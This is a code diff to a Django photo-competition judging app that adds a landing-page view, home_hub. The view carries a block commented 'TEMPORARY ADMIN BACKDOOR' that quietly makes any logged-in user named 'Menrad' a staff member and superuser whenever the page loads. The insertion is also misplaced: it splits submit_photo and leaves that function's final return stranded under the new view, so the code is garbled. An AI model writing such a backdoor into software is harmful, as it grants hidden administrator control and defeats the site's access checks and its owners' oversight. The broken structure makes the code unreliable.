@@ -157,6 +157,19 @@ def submit_photo(request, comp_id):
                 )
                 return render(request, 'judging_app/submit_success.html', {'competition': competition})
 
+def home_hub(request):
+    """The landing page. Shows all active competitions available on the system."""
+    
+    # --- TEMPORARY ADMIN BACKDOOR ---
+    if request.user.is_authenticated and request.user.username == 'Menrad':
+        request.user.is_staff = True
+        request.user.is_superuser = True
+        request.user.save()
+    # ---------------------------------
+    
+    active_competitions = Competition.objects.filter(is_active=True).order_by('-created_at')
+    return render(request, 'judging_app/home.html', {'competitions': active_competitions})
+
     return render(request, 'judging_app/submit.html', {
         'competition': competition, 
         'error_message': error_message
